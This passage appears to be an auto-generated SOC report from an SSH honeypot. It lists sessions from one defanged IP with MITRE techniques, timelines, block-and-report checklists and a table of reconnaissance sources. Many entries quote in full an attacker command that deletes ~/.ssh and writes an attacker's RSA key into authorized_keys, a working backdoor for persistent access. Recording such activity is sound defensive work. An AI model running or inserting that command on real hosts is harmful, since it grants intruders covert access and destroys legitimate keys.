| `2026-06-15 04:10:50` | `cowrie.command.failed` |
| `2026-06-15 04:10:50` | `cowrie.log.closed` |
| `2026-06-15 04:10:50` | `cowrie.session.params` |
| `2026-06-15 04:10:50` | `cowrie.command.input` |
| `2026-06-15 04:10:50` | `cowrie.session.file_download` |
| `2026-06-15 04:10:50` | `cowrie.log.closed` |
| `2026-06-15 04:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f2fdf5c41d

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:10 |
| **Last Seen** | 2026-06-15 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:10:53` | `cowrie.session.connect` |
| `2026-06-15 04:10:53` | `cowrie.client.version` |
| `2026-06-15 04:10:53` | `cowrie.client.kex` |
| `2026-06-15 04:10:54` | `cowrie.login.success` |
| `2026-06-15 04:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72aa1f85395

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:18 |
| **Last Seen** | 2026-06-15 04:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:18:36` | `cowrie.session.connect` |
| `2026-06-15 04:18:36` | `cowrie.client.version` |
| `2026-06-15 04:18:36` | `cowrie.client.kex` |
| `2026-06-15 04:18:37` | `cowrie.login.success` |
| `2026-06-15 04:18:37` | `cowrie.session.params` |
| `2026-06-15 04:18:37` | `cowrie.command.input` |
| `2026-06-15 04:18:37` | `cowrie.command.failed` |
| `2026-06-15 04:18:37` | `cowrie.log.closed` |
| `2026-06-15 04:18:38` | `cowrie.session.params` |
| `2026-06-15 04:18:38` | `cowrie.command.input` |
| `2026-06-15 04:18:38` | `cowrie.session.file_download` |
| `2026-06-15 04:18:38` | `cowrie.log.closed` |
| `2026-06-15 04:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea69d4af801c

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:18 |
| **Last Seen** | 2026-06-15 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:18:40` | `cowrie.session.connect` |
| `2026-06-15 04:18:40` | `cowrie.client.version` |
| `2026-06-15 04:18:40` | `cowrie.client.kex` |
| `2026-06-15 04:18:41` | `cowrie.login.success` |
| `2026-06-15 04:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bea8d61b05c

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:20 |
| **Last Seen** | 2026-06-15 04:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:20:34` | `cowrie.session.connect` |
| `2026-06-15 04:20:34` | `cowrie.client.version` |
| `2026-06-15 04:20:34` | `cowrie.client.kex` |
| `2026-06-15 04:20:35` | `cowrie.login.success` |
| `2026-06-15 04:20:36` | `cowrie.session.params` |
| `2026-06-15 04:20:36` | `cowrie.command.input` |
| `2026-06-15 04:20:36` | `cowrie.command.failed` |
| `2026-06-15 04:20:36` | `cowrie.log.closed` |
| `2026-06-15 04:20:36` | `cowrie.session.params` |
| `2026-06-15 04:20:36` | `cowrie.command.input` |
| `2026-06-15 04:20:36` | `cowrie.session.file_download` |
| `2026-06-15 04:20:36` | `cowrie.log.closed` |
| `2026-06-15 04:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c01d328d56

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:20 |
| **Last Seen** | 2026-06-15 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:20:39` | `cowrie.session.connect` |
| `2026-06-15 04:20:39` | `cowrie.client.version` |
| `2026-06-15 04:20:39` | `cowrie.client.kex` |
| `2026-06-15 04:20:39` | `cowrie.login.success` |
| `2026-06-15 04:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f445eb60162f

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:24 |
| **Last Seen** | 2026-06-15 04:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:24:23` | `cowrie.session.connect` |
| `2026-06-15 04:24:23` | `cowrie.client.version` |
| `2026-06-15 04:24:23` | `cowrie.client.kex` |
| `2026-06-15 04:24:24` | `cowrie.login.success` |
| `2026-06-15 04:24:24` | `cowrie.session.params` |
| `2026-06-15 04:24:24` | `cowrie.command.input` |
| `2026-06-15 04:24:24` | `cowrie.command.failed` |
| `2026-06-15 04:24:25` | `cowrie.log.closed` |
| `2026-06-15 04:24:25` | `cowrie.session.params` |
| `2026-06-15 04:24:25` | `cowrie.command.input` |
| `2026-06-15 04:24:25` | `cowrie.session.file_download` |
| `2026-06-15 04:24:25` | `cowrie.log.closed` |
| `2026-06-15 04:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf3e2eb3333

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:24 |
| **Last Seen** | 2026-06-15 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:24:27` | `cowrie.session.connect` |
| `2026-06-15 04:24:27` | `cowrie.client.version` |
| `2026-06-15 04:24:27` | `cowrie.client.kex` |
| `2026-06-15 04:24:28` | `cowrie.login.success` |
| `2026-06-15 04:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d576a416ec7d

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:26 |
| **Last Seen** | 2026-06-15 04:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:26:17` | `cowrie.session.connect` |
| `2026-06-15 04:26:17` | `cowrie.client.version` |
| `2026-06-15 04:26:17` | `cowrie.client.kex` |
| `2026-06-15 04:26:18` | `cowrie.login.success` |
| `2026-06-15 04:26:18` | `cowrie.session.params` |
| `2026-06-15 04:26:18` | `cowrie.command.input` |
| `2026-06-15 04:26:18` | `cowrie.command.failed` |
| `2026-06-15 04:26:19` | `cowrie.log.closed` |
| `2026-06-15 04:26:19` | `cowrie.session.params` |
| `2026-06-15 04:26:19` | `cowrie.command.input` |
| `2026-06-15 04:26:19` | `cowrie.session.file_download` |
| `2026-06-15 04:26:19` | `cowrie.log.closed` |
| `2026-06-15 04:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81227a13f272

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:26 |
| **Last Seen** | 2026-06-15 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:26:21` | `cowrie.session.connect` |
| `2026-06-15 04:26:21` | `cowrie.client.version` |
| `2026-06-15 04:26:22` | `cowrie.client.kex` |
| `2026-06-15 04:26:22` | `cowrie.login.success` |
| `2026-06-15 04:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f9e83d2026

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:30 |
| **Last Seen** | 2026-06-15 04:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:30:13` | `cowrie.session.connect` |
| `2026-06-15 04:30:13` | `cowrie.client.version` |
| `2026-06-15 04:30:13` | `cowrie.client.kex` |
| `2026-06-15 04:30:14` | `cowrie.login.success` |
| `2026-06-15 04:30:14` | `cowrie.session.params` |
| `2026-06-15 04:30:14` | `cowrie.command.input` |
| `2026-06-15 04:30:14` | `cowrie.command.failed` |
| `2026-06-15 04:30:14` | `cowrie.log.closed` |
| `2026-06-15 04:30:15` | `cowrie.session.params` |
| `2026-06-15 04:30:15` | `cowrie.command.input` |
| `2026-06-15 04:30:15` | `cowrie.session.file_download` |
| `2026-06-15 04:30:15` | `cowrie.log.closed` |
| `2026-06-15 04:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6a9b29bae8

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:30 |
| **Last Seen** | 2026-06-15 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:30:17` | `cowrie.session.connect` |
| `2026-06-15 04:30:17` | `cowrie.client.version` |
| `2026-06-15 04:30:17` | `cowrie.client.kex` |
| `2026-06-15 04:30:18` | `cowrie.login.success` |
| `2026-06-15 04:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120d8171b5d8

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:32 |
| **Last Seen** | 2026-06-15 04:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:32:08` | `cowrie.session.connect` |
| `2026-06-15 04:32:08` | `cowrie.client.version` |
| `2026-06-15 04:32:08` | `cowrie.client.kex` |
| `2026-06-15 04:32:09` | `cowrie.login.success` |
| `2026-06-15 04:32:09` | `cowrie.session.params` |
| `2026-06-15 04:32:09` | `cowrie.command.input` |
| `2026-06-15 04:32:09` | `cowrie.command.failed` |
| `2026-06-15 04:32:09` | `cowrie.log.closed` |
| `2026-06-15 04:32:10` | `cowrie.session.params` |
| `2026-06-15 04:32:10` | `cowrie.command.input` |
| `2026-06-15 04:32:10` | `cowrie.session.file_download` |
| `2026-06-15 04:32:10` | `cowrie.log.closed` |
| `2026-06-15 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77b51c91224

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:32 |
| **Last Seen** | 2026-06-15 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:32:12` | `cowrie.session.connect` |
| `2026-06-15 04:32:12` | `cowrie.client.version` |
| `2026-06-15 04:32:12` | `cowrie.client.kex` |
| `2026-06-15 04:32:13` | `cowrie.login.success` |
| `2026-06-15 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fd7b0740ca

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:34 |
| **Last Seen** | 2026-06-15 04:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:34:07` | `cowrie.session.connect` |
| `2026-06-15 04:34:07` | `cowrie.client.version` |
| `2026-06-15 04:34:07` | `cowrie.client.kex` |
| `2026-06-15 04:34:08` | `cowrie.login.success` |
| `2026-06-15 04:34:08` | `cowrie.session.params` |
| `2026-06-15 04:34:08` | `cowrie.command.input` |
| `2026-06-15 04:34:08` | `cowrie.command.failed` |
| `2026-06-15 04:34:09` | `cowrie.log.closed` |
| `2026-06-15 04:34:09` | `cowrie.session.params` |
| `2026-06-15 04:34:09` | `cowrie.command.input` |
| `2026-06-15 04:34:09` | `cowrie.session.file_download` |
| `2026-06-15 04:34:09` | `cowrie.log.closed` |
| `2026-06-15 04:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a379df8b54ff

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:34 |
| **Last Seen** | 2026-06-15 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:34:11` | `cowrie.session.connect` |
| `2026-06-15 04:34:11` | `cowrie.client.version` |
| `2026-06-15 04:34:11` | `cowrie.client.kex` |
| `2026-06-15 04:34:12` | `cowrie.login.success` |
| `2026-06-15 04:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.247.218[.]112` | **34** | 2026-06-15 02:26 | 2026-06-15 03:37 | 52m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.14.47[.]195` | **33** | 2026-06-15 02:08 | 2026-06-15 02:08 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `117.102.86[.]226` | **31** | 2026-06-15 03:27 | 2026-06-15 04:37 | 1m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.182.219[.]135` | **31** | 2026-06-15 00:32 | 2026-06-15 01:34 | 0m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.89[.]144` | **22** | 2026-06-15 01:30 | 2026-06-15 01:46 | 30m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `142.93.48[.]137` | **21** | 2026-06-15 01:16 | 2026-06-15 03:00 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]24` | **20** | 2026-06-15 03:49 | 2026-06-15 04:29 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `52.176.211[.]73` | **20** | 2026-06-15 03:56 | 2026-06-15 04:36 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.168.194[.]41` | **15** | 2026-06-15 00:55 | 2026-06-15 01:27 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `151.33.34[.]75` | **14** | 2026-06-15 00:46 | 2026-06-15 01:24 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.230.150[.]187` | **12** | 2026-06-15 02:12 | 2026-06-15 04:09 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `103.188.177[.]46` | **5** | 2026-06-15 02:25 | 2026-06-15 02:37 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `41.90.100[.]147` | **4** | 2026-06-15 02:30 | 2026-06-15 03:47 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.230[.]153` | **3** | 2026-06-15 02:40 | 2026-06-15 02:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.253.182[.]187` | **2** | 2026-06-15 01:29 | 2026-06-15 01:31 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.163.15[.]93` | **2** | 2026-06-15 01:52 | 2026-06-15 01:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `201.63.223[.]140` | **2** | 2026-06-15 04:11 | 2026-06-15 04:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.188.61[.]55` | 1 | 2026-06-15 02:01 | 2026-06-15 02:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `110.14.190[.]217` | 1 | 2026-06-15 01:13 | 2026-06-15 01:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.34.130[.]221` | 1 | 2026-06-15 03:49 | 2026-06-15 03:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.127[.]7` | 1 | 2026-06-15 00:27 | 2026-06-15 00:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.140[.]37` | 1 | 2026-06-15 00:46 | 2026-06-15 00:48 | 120s | 0 | `T1592` | 🟢 LOW |
